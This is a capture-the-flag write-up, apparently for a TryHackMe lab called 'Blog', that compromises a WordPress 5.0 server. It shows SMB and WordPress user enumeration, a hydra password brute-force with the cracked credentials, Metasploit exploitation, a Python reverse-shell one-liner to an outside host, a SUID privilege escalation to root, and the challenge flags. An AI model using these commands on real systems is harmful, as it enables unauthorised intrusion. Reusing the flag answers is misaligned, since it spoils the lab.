# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :-------------- |
| 20 | SSH |
| 80 | HTTP |
| 139 | NETBIOS-SSN SMB |
| 445 | NETBIOS-SSN SMB |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
| 256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
| 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8
80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
| BLOG<00> Flags: <unique><active>
| BLOG<03> Flags: <unique><active>
| BLOG<20> Flags: <unique><active>
| \x01\x02__MSBROWSE__\x02<01> Flags: <group><active>
| WORKGROUP<00> Flags: <group><active>
| WORKGROUP<1d> Flags: <unique><active>
| WORKGROUP<1e> Flags: <group><active>
| Statistics:
| 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
| 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_ 00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
| Computer name: blog
| NetBIOS computer name: BLOG\x00
| Domain name: \x00
| FQDN: blog
|_ System time: 2025-03-27T22:23:50+00:00
| p2p-conficker:
| Checking for Conficker.C or higher...
| Check 1 (port 6326/tcp): CLEAN (Couldn't connect)
| Check 2 (port 64576/tcp): CLEAN (Couldn't connect)
| Check 3 (port 35557/udp): CLEAN (Failed to receive data)
| Check 4 (port 57267/udp): CLEAN (Failed to receive data)
|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
| date: 2025-03-27T22:23:50
|_ start_date: N/A
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled but not required
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
```


# RECONNAISSANCE
---

We can see that `smb` is enabled in the system, let's try to search if the anonymous login is enabled:



```
smbclient -L \\\\10.10.62.71\\ -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename Type Comment
	--------- ---- -------
	print$ Disk Printer Drivers
	BillySMB Disk Billy's local SMB Share
	IPC$ IPC IPC Service (blog server (Samba, Ubuntu))
```

We got an interesting share: `BillySMB`, let's read it:

```
smbclient \\\\10.10.62.71\\BillySMB -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
 . D 0 Tue May 26 18:17:05 2020
 .. D 0 Tue May 26 17:58:23 2020
 Alice-White-Rabbit.jpg N 33378 Tue May 26 18:17:01 2020
 tswift.mp4 N 1236733 Tue May 26 18:13:45 2020
 check-this.png N 3082 Tue May 26 18:13:43 2020
```

The `check-this.png` file contains a QR code which simply takes us to a Youtube video, in the `Alice-White-Rabbit.jpg`, we can extract the hidden data, it gives us a `rabbit_hole.txt` file, which says this:

![Pasted image 20250327173926.png](../../IMAGES/Pasted%20image%2020250327173926.png)

The `tswift.mp4` file does not contain anything, seems like the SMB is not useful for now, let's proceed to the web application, if we remember, `robots.txt` entrance is allowed:

![Pasted image 20250327174241.png](../../IMAGES/Pasted%20image%2020250327174241.png)



If we try to go to `/wp-admin/`:

![Pasted image 20250327174317.png](../../IMAGES/Pasted%20image%2020250327174317.png)

We need to add `blog.thm` to `/etc/hosts`:


```bash
echo 'IP blog.thm' | sudo tee -a /etc/hosts
```

We are dealing with WordPress, if entrance to `wp-json/wp/v2/users` is allowed, we can easily enumerate users:

```json
curl http://blog.thm/wp-json/wp/v2/users -s | jq
[
 {
 "id": 1,
 "name": "Billy Joel",
 "url": "",
 "description": "",
 "link": "http://blog.thm/author/bjoel/",
 "slug": "bjoel",
 "avatar_urls": {
 "24": "http://0.gravatar.com/avatar/9943fa6dfe2ab4088f676ff75dc1f848?s=24&d=mm&r=g",
 "48": "http://0.gravatar.com/avatar/9943fa6dfe2ab4088f676ff75dc1f848?s=48&d=mm&r=g",
 "96": "http://0.gravatar.com/avatar/9943fa6dfe2ab4088f676ff75dc1f848?s=96&d=mm&r=g"
 },
 "meta": [],
 "_links": {
 "self": [
 {
 "href": "http://blog.thm/wp-json/wp/v2/users/1"
 }
 ],
 "collection": [
 {
 "href": "http://blog.thm/wp-json/wp/v2/users"
 }
 ]
 }
 },
 {
 "id": 3,
 "name": "Karen Wheeler",
 "url": "",
 "description": "",
 "link": "http://blog.thm/author/kwheel/",
 "slug": "kwheel",
 "avatar_urls": {
 "24": "http://0.gravatar.com/avatar/3e7bf1e5f26496543c964dc04515bb6a?s=24&d=mm&r=g",
 "48": "http://0.gravatar.com/avatar/3e7bf1e5f26496543c964dc04515bb6a?s=48&d=mm&r=g",
 "96": "http://0.gravatar.com/avatar/3e7bf1e5f26496543c964dc04515bb6a?s=96&d=mm&r=g"
 },
 "meta": [],
 "_links": {
 "self": [
 {
 "href": "http://blog.thm/wp-json/wp/v2/users/3"
 }
 ],
 "collection": [
 {
 "href": "http://blog.thm/wp-json/wp/v2/users"
 }
 ]
 }
 }
]
```

Let's grep for `slug`:

```
curl http://blog.thm/wp-json/wp/v2/users -s | jq | grep slug
 "slug": "bjoel",
 "slug": "kwheel",
```


We got two users, what about trying to bruteforce with hydra:

```
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=kwheel&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered"
```

![Pasted image 20250327183359.png](../../IMAGES/Pasted%20image%2020250327183359.png)

We got it:

```
kwheel:cutiepie1
```


![Pasted image 20250328145550.png](../../IMAGES/Pasted%20image%2020250328145550.png)


# EXPLOITATION
---

We got the login, we can search for an exploit regarding the `wordpress 5.0` 


![Pasted image 20250328145750.png](../../IMAGES/Pasted%20image%2020250328145750.png)

![Pasted image 20250328150658.png](../../IMAGES/Pasted%20image%2020250328150658.png)



Let's use these options in order to get the shell in `metasploit`:


```
set username kwheel
set password cutiepie1
set rhosts blog.thm
set lhost tun0
exploit
```

After we send the exploit, we get a `meterpreter` session:

![Pasted image 20250328150952.png](../../IMAGES/Pasted%20image%2020250328150952.png)

We can migrate into netcat for a more comfortable shell or stay in meterpreter, I decided to migrate just for run:

```
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---


If we migrated to netcat we can stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

We can begin by checking the `SUID 4000` binaries 

```
find / -perm -4000 2>/dev/null
```

We can find this:

![Pasted image 20250328152927.png](../../IMAGES/Pasted%20image%2020250328152927.png)

There's something unusual, a binary called `/usr/sbin/checker`, let's check it out:

```
www-data@blog:/usr/sbin$ ltrace checker
getenv("admin") = nil
puts("Not an Admin"Not an Admin
) = 13
+++ exited (status 0) +++
```

- The binary checks for the environment variable`admin` using`getenv("admin")`.
- If`admin` is not set (`nil`), it prints`"Not an Admin"` and exits.
- **Goal**: Trick the binary into thinking`admin` is set to trigger privileged code (likely a root shell or action).


We can do the following in order to get a root shell:

```
admin=1 /usr/sbin/checker /bin/sh
```

![Pasted image 20250328153450.png](../../IMAGES/Pasted%20image%2020250328153450.png)

Let's try reading flags:

```
root@blog:/tmp# cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

We need to find the real flag, let's do this:

```
find / -user bjoel \( -name "*flag*" -o -name "*user*" \) 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
```

We got it:

```
root@blog:/tmp# cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab
```

```
root@blog:/tmp# cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```
